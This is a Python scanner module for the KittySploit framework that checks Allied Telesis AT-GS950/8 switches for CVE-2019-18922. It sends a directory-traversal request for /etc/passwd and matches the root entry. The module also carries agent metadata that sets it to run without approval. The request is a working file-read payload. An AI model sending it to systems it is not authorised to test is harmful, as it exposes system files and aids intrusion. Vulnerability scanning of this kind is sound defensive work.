#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Allied Telesis AT-GS950/8 until Firmware AT-S107 V."""

import re
from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Allied Telesis AT-GS950/8 - Local File Inclusion Detection',
        'description': 'Allied Telesis AT-GS950/8 until Firmware AT-S107 V.1.1.3 is susceptible to local file inclusion via its web interface.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'cve', 'cve2019', 'packetstorm', 'seclists', 'allied', 'lfi', 'alliedtelesis', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://packetstormsecurity.com/files/155504/Allied-Telesis-AT-GS950-8-Directory-Traversal.html',
            'https://pastebin.com/dpEGKUGz',
            'https://nvd.nist.gov/vuln/detail/CVE-2019-18922',
            'http://packetstormsecurity.com/files/155504/Allied-Telesis-AT-GS950-8-Directory-Traversal.html',
            'http://seclists.org/fulldisclosure/2019/Nov/31',
        ],
        'cve': 'CVE-2019-18922',
    }

    def run(self):
        r = self.http_request(method="GET", path='/../../../../../../etc/passwd', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_regexes = ('root:[x*]:0:0',)
        if (any(re.search(rx, body, 0) for rx in body_regexes)):
            self.set_info(
                severity='high',
                reason="Allied Telesis AT-GS950/8 - Local File Inclusion detected",
                path='/../../../../../../etc/passwd',
            )
            return True
        return False

